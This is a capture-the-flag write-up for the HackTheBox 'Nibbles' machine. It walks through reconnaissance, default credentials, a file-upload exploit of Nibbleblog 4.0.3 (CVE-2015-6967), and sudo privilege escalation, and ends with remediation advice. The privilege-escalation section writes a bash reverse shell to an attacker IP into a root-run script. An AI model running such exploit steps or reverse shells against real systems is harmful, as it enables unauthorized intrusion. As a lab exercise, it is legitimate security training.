# Nibbles — HackTheBox

| Field | Detail |
|---|---|
| OS | Linux (Ubuntu 16.04) |
| Difficulty | Easy |
| CVE | CVE-2015-6967 |
| Date | March 20, 2026 |
| Result | root shell obtained |

## Summary

Nibbleblog 4.0.3 exposed on port 80. Weak credentials combined with CVE-2015-6967 (Arbitrary File Upload in the My Image plugin) to achieve RCE. Privilege escalation via password-less sudo on a user-writable script.

## Attack Chain

| # | Technique | Result |
|---|---|---|
| 1 | Nmap port scan | Ports 22, 80 open |
| 2 | Source code analysis | `/nibbleblog/` path in HTML comment |
| 3 | Gobuster enumeration | CMS structure mapped, `/content/` accessible |
| 4 | XML file disclosure | Username `admin` from `users.xml` |
| 5 | Default credentials | Login `admin:nibbles` |
| 6 | CVE-2015-6967 | RCE via file upload in My Image plugin |
| 7 | sudo misconfiguration | Privesc to root via `monitor.sh` |

## Reconnaissance

```bash
sudo nmap -sC -sV 10.129.96.84
```

Open ports: 22 (SSH), 80 (HTTP — Apache 2.4.18).

### Web Enumeration

Homepage shows only `Hello world!`. HTML source reveals:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Nibbleblog 4.0.3 confirmed via `/nibbleblog/README`.

```bash
gobuster dir -u http://10.129.96.84/nibbleblog/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,xml,txt
```

Key findings: `/admin.php`, `/content/` (directory listing enabled), `/install.php`.

### Credential Gathering

`/nibbleblog/content/private/` publicly accessible. `users.xml` exposes username `admin`. Password `nibbles` grants access to `/nibbleblog/admin.php`.

> Note: Nibbleblog blacklists IPs after failed login attempts — brute force not viable.

## Initial Access — CVE-2015-6967

The My Image plugin does not validate file extensions, allowing arbitrary PHP upload.

```bash
python3 nibbleblog_4.0.3.py \
  -t http://10.129.96.84/nibbleblog/admin.php \
  -u admin -p nibbles -shell
```

Shell obtained as `nibbler` (uid=1001) via:
```
http://10.129.96.84/nibbleblog/content/private/plugins/my_image/rse.php
```

## Privilege Escalation

```bash
sudo -l
# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The directory did not exist — created with arbitrary content:

```bash
mkdir -p /home/nibbler/personal/stuff
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.15.48/4444 0>&1\n' \
  > /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Root shell received.

## Recommendations

- Update Nibbleblog — version 4.0.3 is obsolete (CVE from 2015)
- Disable directory listing on `/content/private/`
- Use complex credentials — `nibbles` is trivially guessable
- Never assign `NOPASSWD` on scripts writable by the same user
- Block `users.xml` and config files from HTTP access
